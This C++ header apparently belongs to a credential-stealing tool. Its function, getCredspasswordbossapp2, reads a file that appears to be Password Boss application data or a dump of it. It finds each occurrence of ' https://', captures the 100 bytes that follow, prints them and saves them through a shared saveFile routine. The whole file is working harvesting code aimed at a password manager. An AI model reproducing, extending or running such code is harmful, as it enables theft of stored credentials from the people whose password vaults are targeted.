#pragma once
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include "../../core/saveFile.h"

int getCredspasswordbossapp2(std::string filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    std::vector<unsigned char> searchPattern = { 0x20, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f };
    std::vector<unsigned char> foundData;

    while (!file.eof()) {
        unsigned char c;
        file.read(reinterpret_cast<char*>(&c), sizeof(c));

        if (c == searchPattern[foundData.size()]) {
            foundData.push_back(c);
            if (foundData.size() == searchPattern.size()) {
                // We found the search pattern, now collect data until reaching the 100 data limit
                std::vector<unsigned char> extractedData;
                int dataCount = 0;

                while (dataCount < 100 && !file.eof()) {
                    file.read(reinterpret_cast<char*>(&c), sizeof(c));
                    extractedData.push_back(c);
                    dataCount++;
                }

                // Convert the binary data to a UTF-8 string
                std::string utf8ExtractedData(extractedData.begin(), extractedData.end());

                // Print the extracted UTF-8 string
                std::cout << "Pattern data: " + utf8ExtractedData << std::endl;

                //Save into file
                saveFile(utf8ExtractedData);

                foundData.clear();
            }
        }
        else {
            foundData.clear();
        }
    }

    file.close();
    return 0;
}
